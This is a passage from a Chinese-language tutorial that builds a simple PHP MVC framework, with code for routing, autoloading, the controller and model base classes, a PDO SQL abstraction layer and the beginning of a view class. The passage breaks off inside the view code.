<p>以上文件都其实可以直接在 index.php 文件中包含，常量也可以直接在 index.php 中定义，我们这么做的原因是为了在后期管理和拓展中更加的方便，所以把需要在一开始的时候就加载运行的程序统一放到一个单独的文件中引用。</p>
<p>先来看看config文件下的 config .php 文件，该文件的主要作用是设置一些程序的配置项及数据库连接等，主要内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">// 应用目录为当前目录</div><div class="line">define(&apos;APP_PATH&apos;, __DIR__ . &apos;/&apos;);</div><div class="line"></div><div class="line">// 开启调试模式</div><div class="line">define(&apos;APP_DEBUG&apos;, true);</div><div class="line"></div><div class="line">// 加载框架文件</div><div class="line">require(APP_PATH . &apos;myphp/Myphp.php&apos;);</div><div class="line"></div><div class="line">// 加载配置文件</div><div class="line">$config = require(APP_PATH . &apos;config/config.php&apos;);</div><div class="line"></div><div class="line">// 实例化框架类</div><div class="line">(new Myphp($config))-&gt;run();</div></pre></td></tr></table></figure>
<p>应该说 config.php 涉及到的内容并不多，不过是一些基础数据库的设置，再来看看 myphp下的共用框架入口文件 MyPHP.php 应该怎么写。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">/**</div><div class="line"> * myphp框架核心</div><div class="line"> */</div><div class="line">class Myphp</div><div class="line">&#123;</div><div class="line">    protected $config = [];</div><div class="line"></div><div class="line">    public function __construct($config)</div><div class="line">    &#123;</div><div class="line">        $this-&gt;config = $config;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 运行程序</div><div class="line">    public function run()</div><div class="line">    &#123;</div><div class="line">        spl_autoload_register(array($this, &apos;loadClass&apos;));</div><div class="line">        $this-&gt;setReporting();</div><div class="line">        $this-&gt;removeMagicQuotes();</div><div class="line">        $this-&gt;unregisterGlobals();</div><div class="line">        $this-&gt;setDbConfig();</div><div class="line">        $this-&gt;route();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 路由处理</div><div class="line">    public function route()</div><div class="line">    &#123;</div><div class="line">        $controllerName = $this-&gt;config[&apos;defaultController&apos;];</div><div class="line">        $actionName = $this-&gt;config[&apos;defaultAction&apos;];</div><div class="line">        $param = array();</div><div class="line"></div><div class="line">        $url = $_SERVER[&apos;REQUEST_URI&apos;];</div><div class="line">        // 清除?之后的内容</div><div class="line">        $position = strpos($url, &apos;?&apos;);</div><div class="line">        $url = $position === false ? $url : substr($url, 0, $position);</div><div class="line">        // 删除前后的“/”</div><div class="line">        $url = trim($url, &apos;/&apos;);</div><div class="line"></div><div class="line">        if ($url) &#123;</div><div class="line">            // 使用“/”分割字符串，并保存在数组中</div><div class="line">            $urlArray = explode(&apos;/&apos;, $url);</div><div class="line">            // 删除空的数组元素</div><div class="line">            $urlArray = array_filter($urlArray);</div><div class="line">            </div><div class="line">            // 获取控制器名</div><div class="line">            $controllerName = ucfirst($urlArray[0]);</div><div class="line">            </div><div class="line">            // 获取动作名</div><div class="line">            array_shift($urlArray);</div><div class="line">            $actionName = $urlArray ? $urlArray[0] : $actionName;</div><div class="line">            </div><div class="line">            // 获取URL参数</div><div class="line">            array_shift($urlArray);</div><div class="line">            $param = $urlArray ? $urlArray : array();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        // 判断控制器和操作是否存在</div><div class="line">        $controller = $controllerName . &apos;Controller&apos;;</div><div class="line">        if (!class_exists($controller)) &#123;</div><div class="line">            exit($controller . &apos;控制器不存在&apos;);</div><div class="line">        &#125;</div><div class="line">        if (!method_exists($controller, $actionName)) &#123;</div><div class="line">            exit($actionName . &apos;方法不存在&apos;);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        // 如果控制器和操作名存在，则实例化控制器，因为控制器对象里面</div><div class="line">        // 还会用到控制器名和操作名，所以实例化的时候把他们俩的名称也</div><div class="line">        // 传进去。结合Controller基类一起看</div><div class="line">        $dispatch = new $controller($controllerName, $actionName);</div><div class="line"></div><div class="line">        // $dispatch保存控制器实例化后的对象，我们就可以调用它的方法，</div><div class="line">        // 也可以像方法中传入参数，以下等同于：$dispatch-&gt;$actionName($param)</div><div class="line">        call_user_func_array(array($dispatch, $actionName), $param);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 检测开发环境</div><div class="line">    public function setReporting()</div><div class="line">    &#123;</div><div class="line">        if (APP_DEBUG === true) &#123;</div><div class="line">            error_reporting(E_ALL);</div><div class="line">            ini_set(&apos;display_errors&apos;,&apos;On&apos;);</div><div class="line">        &#125; else &#123;</div><div class="line">            error_reporting(E_ALL);</div><div class="line">            ini_set(&apos;display_errors&apos;,&apos;Off&apos;);</div><div class="line">            ini_set(&apos;log_errors&apos;, &apos;On&apos;);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 删除敏感字符</div><div class="line">    public function stripSlashesDeep($value)</div><div class="line">    &#123;</div><div class="line">        $value = is_array($value) ? array_map(array($this, &apos;stripSlashesDeep&apos;), $value) : stripslashes($value);</div><div class="line">        return $value;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 检测敏感字符并删除</div><div class="line">    public function removeMagicQuotes()</div><div class="line">    &#123;</div><div class="line">        if (get_magic_quotes_gpc()) &#123;</div><div class="line">            $_GET = isset($_GET) ? $this-&gt;stripSlashesDeep($_GET ) : &apos;&apos;;</div><div class="line">            $_POST = isset($_POST) ? $this-&gt;stripSlashesDeep($_POST ) : &apos;&apos;;</div><div class="line">            $_COOKIE = isset($_COOKIE) ? $this-&gt;stripSlashesDeep($_COOKIE) : &apos;&apos;;</div><div class="line">            $_SESSION = isset($_SESSION) ? $this-&gt;stripSlashesDeep($_SESSION) : &apos;&apos;;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 检测自定义全局变量并移除。因为 register_globals 已经弃用，如果</div><div class="line">    // 已经弃用的 register_globals 指令被设置为 on，那么局部变量也将</div><div class="line">    // 在脚本的全局作用域中可用。 例如， $_POST[&apos;foo&apos;] 也将以 $foo 的</div><div class="line">    // 形式存在，这样写是不好的实现，会影响代码中的其他变量。 相关信息，</div><div class="line">    // 参考: http://php.net/manual/zh/faq.using.php#faq.register-globals</div><div class="line">    public function unregisterGlobals()</div><div class="line">    &#123;</div><div class="line">        if (ini_get(&apos;register_globals&apos;)) &#123;</div><div class="line">            $array = array(&apos;_SESSION&apos;, &apos;_POST&apos;, &apos;_GET&apos;, &apos;_COOKIE&apos;, &apos;_REQUEST&apos;, &apos;_SERVER&apos;, &apos;_ENV&apos;, &apos;_FILES&apos;);</div><div class="line">            foreach ($array as $value) &#123;</div><div class="line">                foreach ($GLOBALS[$value] as $key =&gt; $var) &#123;</div><div class="line">                    if ($var === $GLOBALS[$key]) &#123;</div><div class="line">                        unset($GLOBALS[$key]);</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 配置数据库信息</div><div class="line">    public function setDbConfig()</div><div class="line">    &#123;</div><div class="line">        if ($this-&gt;config[&apos;db&apos;]) &#123;</div><div class="line">            define(&apos;DB_HOST&apos;, $this-&gt;config[&apos;db&apos;][&apos;host&apos;]);</div><div class="line">            define(&apos;DB_NAME&apos;, $this-&gt;config[&apos;db&apos;][&apos;dbname&apos;]);</div><div class="line">            define(&apos;DB_USER&apos;, $this-&gt;config[&apos;db&apos;][&apos;username&apos;]);</div><div class="line">            define(&apos;DB_PASS&apos;, $this-&gt;config[&apos;db&apos;][&apos;password&apos;]);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 自动加载控制器和模型类 </div><div class="line">    public static function loadClass($class)</div><div class="line">    &#123;</div><div class="line">        $frameworks = __DIR__ . &apos;/&apos; . $class . &apos;.php&apos;;</div><div class="line">        $controllers = APP_PATH . &apos;application/controllers/&apos; . $class . &apos;.php&apos;;</div><div class="line">        $models = APP_PATH . &apos;application/models/&apos; . $class . &apos;.php&apos;;</div><div class="line"></div><div class="line">        if (file_exists($frameworks)) &#123;</div><div class="line">            // 加载框架核心类</div><div class="line">            include $frameworks;</div><div class="line">        &#125; elseif (file_exists($controllers)) &#123;</div><div class="line">            // 加载应用控制器类</div><div class="line">            include $controllers;</div><div class="line">        &#125; elseif (file_exists($models)) &#123;</div><div class="line">            //加载应用模型类</div><div class="line">            include $models;</div><div class="line">        &#125; else &#123;</div><div class="line">            // 错误代码</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>主请求方法 route()，首先我们想看看我们的 URL 会这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yoursite.com/controllerName/actionName/queryString</div></pre></td></tr></table></figure>
<p>route()的作用就是，从全局变量 \$_GET[‘url’]变量中获取 URL，并将其分割成三部分：\$controller、\$action 和 $queryString。</p>
<p>例如，URL链接为：myphp.com/item/view/1/first-item，那么</p>
<ul>
<li>$controller 就是：item</li>
<li>$action 就是：view</li>
<li>查询字符串Query String就是：array(1, first-item)</li>
</ul>
<p>分割完成后，会实例化一个新的控制器：$controller.’Controller’（其中“.”是连字符），并调用其方法 $action。</p>
<h3 id="控制器-Controller基类"><a href="#控制器-Controller基类" class="headerlink" title="控制器/Controller基类"></a>控制器/Controller基类</h3><p>接下来的操作就是在 myphp 中建立程序所需的基类，包括控制器、模型和视图的基类。</p>
<p>新建控制器基类为 Controller.php，控制器的主要功能就是总调度，具体具体内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">/**</div><div class="line"> * 控制器基类</div><div class="line"> */</div><div class="line">class Controller</div><div class="line">&#123;</div><div class="line">    protected $_controller;</div><div class="line">    protected $_action;</div><div class="line">    protected $_view;</div><div class="line"> </div><div class="line">    // 构造函数，初始化属性，并实例化对应模型</div><div class="line">    public function __construct($controller, $action)</div><div class="line">    &#123;</div><div class="line">        $this-&gt;_controller = $controller;</div><div class="line">        $this-&gt;_action = $action;</div><div class="line">        $this-&gt;_view = new View($controller, $action);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 分配变量</div><div class="line">    public function assign($name, $value)</div><div class="line">    &#123;</div><div class="line">        $this-&gt;_view-&gt;assign($name, $value);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 渲染视图</div><div class="line">    public function render()</div><div class="line">    &#123;</div><div class="line">        $this-&gt;_view-&gt;render();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Controller 类实现所有控制器、模型和视图（View类）的通信。在执行析构函数时，我们可以调用 render() 来显示视图（view）文件。</p>
<h3 id="模型Model基类"><a href="#模型Model基类" class="headerlink" title="模型Model基类"></a>模型Model基类</h3><p>新建模型基类为 Model.php，模型基类 Model.php 代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">class Model extends Sql</div><div class="line">&#123;</div><div class="line">    protected $model;</div><div class="line"></div><div class="line">    public function __construct()</div><div class="line">    &#123;</div><div class="line">        // 获取数据库表名</div><div class="line">        if (!$this-&gt;table) &#123;</div><div class="line"></div><div class="line">            // 获取模型类名称</div><div class="line">            $this-&gt;model = get_class($this);</div><div class="line"></div><div class="line">            // 删除类名最后的 Model 字符</div><div class="line">            $this-&gt;model = substr($this-&gt;model, 0, -5);</div><div class="line"></div><div class="line">            // 数据库表名与类名一致</div><div class="line">            $this-&gt;table = strtolower($this-&gt;model);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>考虑到模型需要对数据库进行处理，所以单独建立一个数据库基类 Sql.class.php，模型基类继承 Sql.php，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line"></div><div class="line">class Sql</div><div class="line">&#123;</div><div class="line">    // 数据库表名</div><div class="line">    protected $table;</div><div class="line"></div><div class="line">    // 数据库主键</div><div class="line">    protected $primary = &apos;id&apos;;</div><div class="line"></div><div class="line">    // WHERE和ORDER拼装后的条件</div><div class="line">    private $filter = &apos;&apos;;</div><div class="line"></div><div class="line">    // Pdo bindParam()绑定的参数集合</div><div class="line">    private $param = array();</div><div class="line"></div><div class="line">    /**</div><div class="line">     * 查询条件拼接，使用方式：</div><div class="line">     *</div><div class="line">     * $this-&gt;where([&apos;id = 1&apos;,&apos;and title=&quot;Web&quot;&apos;, ...])-&gt;fetch();</div><div class="line">     * 为防止注入，建议通过$param方式传入参数：</div><div class="line">     * $this-&gt;where([&apos;id = :id&apos;], [&apos;:id&apos; =&gt; $id])-&gt;fetch();</div><div class="line">     *</div><div class="line">     * @param array $where 条件</div><div class="line">     * @return $this 当前对象</div><div class="line">     */</div><div class="line">    public function where($where = array(), $param = array())</div><div class="line">    &#123;</div><div class="line">        if ($where) &#123;</div><div class="line">            $this-&gt;filter .= &apos; WHERE &apos;;</div><div class="line">            $this-&gt;filter .= implode(&apos; &apos;, $where);</div><div class="line"></div><div class="line">            $this-&gt;param = $param;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return $this;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    /**</div><div class="line">     * 拼装排序条件，使用方式：</div><div class="line">     *</div><div class="line">     * $this-&gt;order([&apos;id DESC&apos;, &apos;title ASC&apos;, ...])-&gt;fetch();</div><div class="line">     *</div><div class="line">     * @param array $order 排序条件</div><div class="line">     * @return $this</div><div class="line">     */</div><div class="line">    public function order($order = array())</div><div class="line">    &#123;</div><div class="line">        if($order) &#123;</div><div class="line">            $this-&gt;filter .= &apos; ORDER BY &apos;;</div><div class="line">            $this-&gt;filter .= implode(&apos;,&apos;, $order);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return $this;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 查询所有</div><div class="line">    public function fetchAll()</div><div class="line">    &#123;</div><div class="line">        $sql = sprintf(&quot;select * from `%s` %s&quot;, $this-&gt;table, $this-&gt;filter);</div><div class="line">        $sth = Db::pdo()-&gt;prepare($sql);</div><div class="line">        $sth = $this-&gt;formatParam($sth, $this-&gt;param);</div><div class="line">        $sth-&gt;execute();</div><div class="line"></div><div class="line">        return $sth-&gt;fetchAll();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 查询一条</div><div class="line">    public function fetch()</div><div class="line">    &#123;</div><div class="line">        $sql = sprintf(&quot;select * from `%s` %s&quot;, $this-&gt;table, $this-&gt;filter);</div><div class="line">        $sth = Db::pdo()-&gt;prepare($sql);</div><div class="line">        $sth = $this-&gt;formatParam($sth, $this-&gt;param);</div><div class="line">        $sth-&gt;execute();</div><div class="line"></div><div class="line">        return $sth-&gt;fetch();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 根据条件 (id) 删除</div><div class="line">    public function delete($id)</div><div class="line">    &#123;</div><div class="line">        $sql = sprintf(&quot;delete from `%s` where `%s` = :%s&quot;, $this-&gt;table, $this-&gt;primary, $this-&gt;primary);</div><div class="line">        $sth = Db::pdo()-&gt;prepare($sql);</div><div class="line">        $sth = $this-&gt;formatParam($sth, [$this-&gt;primary =&gt; $id]);</div><div class="line">        $sth-&gt;execute();</div><div class="line"></div><div class="line">        return $sth-&gt;rowCount();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 新增数据</div><div class="line">    public function add($data)</div><div class="line">    &#123;</div><div class="line">        $sql = sprintf(&quot;insert into `%s` %s&quot;, $this-&gt;table, $this-&gt;formatInsert($data));</div><div class="line">        $sth = Db::pdo()-&gt;prepare($sql);</div><div class="line">        $sth = $this-&gt;formatParam($sth, $data);</div><div class="line">        $sth = $this-&gt;formatParam($sth, $this-&gt;param);</div><div class="line">        $sth-&gt;execute();</div><div class="line"></div><div class="line">        return $sth-&gt;rowCount();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 修改数据</div><div class="line">    public function update($data)</div><div class="line">    &#123;</div><div class="line">        $sql = sprintf(&quot;update `%s` set %s %s&quot;, $this-&gt;table, $this-&gt;formatUpdate($data), $this-&gt;filter);</div><div class="line">        $sth = Db::pdo()-&gt;prepare($sql);</div><div class="line">        $sth = $this-&gt;formatParam($sth, $data);</div><div class="line">        $sth = $this-&gt;formatParam($sth, $this-&gt;param);</div><div class="line">        $sth-&gt;execute();</div><div class="line"></div><div class="line">        return $sth-&gt;rowCount();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    /**</div><div class="line">     * 占位符绑定具体的变量值</div><div class="line">     * @param PDOStatement $sth 要绑定的PDOStatement对象</div><div class="line">     * @param array $params 参数，有三种类型：</div><div class="line">     * 1）如果SQL语句用问号?占位符，那么$params应该为</div><div class="line">     *    [$a, $b, $c]</div><div class="line">     * 2）如果SQL语句用冒号:占位符，那么$params应该为</div><div class="line">     *    [&apos;a&apos; =&gt; $a, &apos;b&apos; =&gt; $b, &apos;c&apos; =&gt; $c]</div><div class="line">     *    或者</div><div class="line">     *    [&apos;:a&apos; =&gt; $a, &apos;:b&apos; =&gt; $b, &apos;:c&apos; =&gt; $c]</div><div class="line">     *</div><div class="line">     * @return PDOStatement</div><div class="line">     */</div><div class="line">    public function formatParam(PDOStatement $sth, $params = array())</div><div class="line">    &#123;</div><div class="line">        foreach ($params as $param =&gt; &amp;$value) &#123;</div><div class="line">            $param = is_int($param) ? $param + 1 : &apos;:&apos; . ltrim($param, &apos;:&apos;);</div><div class="line">            $sth-&gt;bindParam($param, $value);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return $sth;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 将数组转换成插入格式的sql语句</div><div class="line">    private function formatInsert($data)</div><div class="line">    &#123;</div><div class="line">        $fields = array();</div><div class="line">        $names = array();</div><div class="line">        foreach ($data as $key =&gt; $value) &#123;</div><div class="line">            $fields[] = sprintf(&quot;`%s`&quot;, $key);</div><div class="line">            $names[] = sprintf(&quot;:%s&quot;, $key);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $field = implode(&apos;,&apos;, $fields);</div><div class="line">        $name = implode(&apos;,&apos;, $names);</div><div class="line"></div><div class="line">        return sprintf(&quot;(%s) values (%s)&quot;, $field, $name);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 将数组转换成更新格式的sql语句</div><div class="line">    private function formatUpdate($data)</div><div class="line">    &#123;</div><div class="line">        $fields = array();</div><div class="line">        foreach ($data as $key =&gt; $value) &#123;</div><div class="line">            $fields[] = sprintf(&quot;`%s` = :%s&quot;, $key, $key);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return implode(&apos;,&apos;, $fields);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>应该说，Sql.php 是框架的核心部分。为什么？因为通过它，我们创建了一个 SQL 抽象层，可以大大减少了数据库的编程工作。虽然 PDO 接口本来已经很简洁，但是抽象之后框架的可灵活性更高。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">/**</div><div class="line"> * 数据库操作类，$pdo属性为静态属性，这样在页面执行周期内，</div><div class="line"> * 只要经过一次赋值，那么第二次再获取还是首次赋值的内容，这</div><div class="line"> * 里就是PDO对象，这样可以确保运行期间只有一个数据库连接对</div><div class="line"> * 像，这种是一种简单的单例模式</div><div class="line"> * Class Db</div><div class="line"> */</div><div class="line">class Db</div><div class="line">&#123;</div><div class="line">    private static $pdo = null;</div><div class="line"></div><div class="line">    public static function pdo()</div><div class="line">    &#123;</div><div class="line">        if (self::$pdo !== null) &#123;</div><div class="line">            return self::$pdo;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $dsn = sprintf(&apos;mysql:host=%s;dbname=%s&apos;, DB_HOST, DB_NAME);</div><div class="line">        $option = array(PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC);</div><div class="line"></div><div class="line">        return self::$pdo = new PDO($dsn, DB_USER, DB_PASS, $option);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="视图View类"><a href="#视图View类" class="headerlink" title="视图View类"></a>视图View类</h3><p>视图类 View.php 内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">/**</div><div class="line"> * 视图基类</div><div class="line"> */</div><div class="line">class View</div><div class="line">&#123;</div><div class="line">    protected $variables = array();</div><div class="line">    protected $_controller;</div><div class="line">    protected $_action;</div><div class="line"></div><div class="line">    function __construct($controller, $action)</div><div class="line">    &#123;</div><div class="line">        $this-&gt;_controller = strtolower($controller);</div><div class="line">        $this-&gt;_action = strtolower($action);</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    // 分配变量</div><div class="line">    public function assign($name, $value)</div><div class="line">    &#123;</div><div class="line">        $this-&gt;variables[$name] = $value;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    // 渲染显示</div><div class="line">    public function render()</div><div class="line">    &#123;</div><div class="line">        extract($this-&gt;variables);</div><div class="line">        $defaultHeader = APP_PATH . &apos;application/views/header.php&apos;;</div><div class="line">        